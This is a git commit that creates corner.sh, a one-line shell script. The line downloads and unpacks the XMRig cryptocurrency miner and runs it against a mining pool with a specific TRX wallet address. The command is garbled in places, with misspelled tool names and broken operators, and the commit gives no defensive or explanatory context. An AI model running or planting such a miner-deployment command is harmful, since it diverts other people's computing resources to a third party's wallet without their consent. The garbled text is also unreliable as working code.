4b06ee328fba955c0fc4497bccf28d55cea1cf6f
yougovpritamsingh <116487141+yougovpritamsingh@users.noreply.github.com>
2022-10-23 14:39:07 +0530

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+uget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-1inux-x64. tar.gz &8 tar -xvf xmrig-6.17.1.gz &8 tar -xvf xmrig-6.17.0-linux-x64.tar.gz &8 cd xmrig 6.17.0 88 ./xmrig o rx.unmineable.com:3333 -a rx -k -u TRX:TG3AtALUjRzr7vgRioRoskW44wnVfbCU5D.cornertech -p y
